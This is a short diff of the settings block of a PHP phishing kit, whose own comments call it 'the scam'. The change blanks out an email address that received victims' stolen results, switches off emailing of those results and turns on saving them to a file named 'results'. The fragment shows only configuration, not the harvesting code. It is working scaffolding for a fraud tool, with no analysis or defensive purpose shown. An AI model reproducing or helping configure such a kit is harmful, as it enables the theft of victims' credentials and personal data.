@@ -12,18 +12,18 @@
          ############# [+] EMAIL INFORMATION [+] ##############
         ########################################################
 
-     	$yours = "betrainjorgue@hotmail.com"; // Edit this to your email 
+     	$yours = ""; // Edit this to your email 
 
 
 	// ================================= //
 
 
 
-	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
+	$sendtoemail = "no";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
 	
 	// ================================= //
 	
-	$saveintext = "no";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
+	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
 	
 	$filename = "results"; // Change |results| to any name you want this will be the (Rzlt file name).html
 	// ================================= //
